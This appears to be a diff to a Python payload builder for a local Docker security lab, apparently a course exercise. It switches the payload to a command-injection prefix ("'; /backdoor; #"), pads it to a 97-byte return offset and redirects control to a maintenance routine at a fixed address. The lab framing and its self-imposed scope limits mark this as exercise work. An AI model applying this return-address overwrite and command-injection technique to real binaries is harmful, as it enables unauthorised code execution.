@@ -5,10 +5,11 @@ Phase II lab binary interface and produces a bounded `config.data` candidate for
 that local Docker lab. It is not a general exploitation toolkit, does not touch
 networks, and does not modify host/grader files.
 
-Current status: the generated candidate is a lab-specific control-flow probe for
-Phase II Medium. It proves the scaffold can write byte-exact config data and can
-exercise the vulnerable path; it must still be validated against the official IC
-success condition before claiming full-credit penetration.
+Current status: the generated candidate is a lab-specific ret-to-maintenance
+probe for Phase II Medium. It writes the intended lab-only command-injection
+argument shape and redirects control to the maintenance routine, but official
+IC-side `/shared/success.txt` must still be observed before any full-credit
+completion claim.
 """
 
 from __future__ import annotations
@@ -24,7 +25,7 @@ LOG_MESSAGE_RET_OFFSET = 97
 # Returning to maintenance_task+5 skips the initial push and preserves 16-byte
 # stack alignment for its libc call path in the supplied Ubuntu 24.04 lab.
 MAINTENANCE_TASK_ALIGNED_ENTRY = 0x401475
-CONTROL_PROBE_PREFIX = b"/backdoor #"
+MAINTENANCE_COMMAND_PREFIX = b"'; /backdoor; #"
 
 
 @dataclass(frozen=True)
@@ -61,7 +62,7 @@ def build_control_flow_probe() -> Phase2Candidate:
     does not claim success by itself.
     """
 
-    value = bytearray(CONTROL_PROBE_PREFIX)
+    value = bytearray(MAINTENANCE_COMMAND_PREFIX)
     if len(value) > LOG_MESSAGE_RET_OFFSET:
         raise ValueError("probe prefix is longer than return-address offset")
     value.extend(b"A" * (LOG_MESSAGE_RET_OFFSET - len(value)))
@@ -78,7 +79,7 @@ def build_control_flow_probe() -> Phase2Candidate:
             "placeholder_only": False,
             "ret_offset": LOG_MESSAGE_RET_OFFSET,
             "partial_target": hex(MAINTENANCE_TASK_ALIGNED_ENTRY),
-            "status": "control-flow-probe-not-success-claim",
+            "status": "ret-to-maintenance-probe-not-success-claim",
         },
     )
 
